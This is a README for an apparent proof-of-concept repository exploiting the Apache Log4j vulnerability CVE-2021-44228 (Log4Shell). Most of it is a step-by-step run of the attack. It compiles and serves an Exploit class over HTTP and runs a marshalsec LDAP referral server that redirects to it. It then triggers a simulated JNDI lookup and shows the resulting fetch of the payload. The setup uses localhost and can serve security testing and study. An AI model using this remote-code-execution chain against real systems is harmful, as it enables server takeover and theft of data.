# CVE-2021-44228 (Apache Log4j Remote Code Execution）

> [all log4j-core versions >=2.0-beta9 and <=2.14.1](https://logging.apache.org/log4j/2.x/security.html)

### Requirements

Java 8 required.

### Usage

Download this project.

```
git clone https://github.com/kimberleyhallifax/log4shell.git
```

Compile exploit code and run python web server.

```
cd CVE-2021-44228-Apache-Log4j-Rce
javac Exploit.java

# For Python2
python -m SimpleHTTPServer 8888
# For Python3
python3 -m http.server 8888

# Make sure python webserver is running the same directory as Exploit.class, to test
  curl -I 127.0.0.1:8888/Exploit.class
```

Build and run the vulnerable jndi LDAP server.

```
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
# Java 8 required
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

Build and run the activation code (simulate an log4j attack on a vulnerable java web server).

```
cd CVE-2021-44228-Apache-Log4j-Rce
mvn clean package
java -cp target/log4j-rce-1.0-SNAPSHOT-all.jar log4j

# 1. in ldapserver console,
#  Send LDAP reference result for Exploit redirecting to http://127.0.0.1:8888/Exploit.class
# 2. in webserver console,
#  127.0.0.1 - - [....] "GET /Exploit.class HTTP/1.1" 200 -
```

### Details Of Vuln
Lookups provide a way to add values to the Log4j configuration at arbitrary places.

[Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)

> The methods to cause leak in finally

```
LogManager.getLogger().error()
LogManager.getLogger().fatal()
```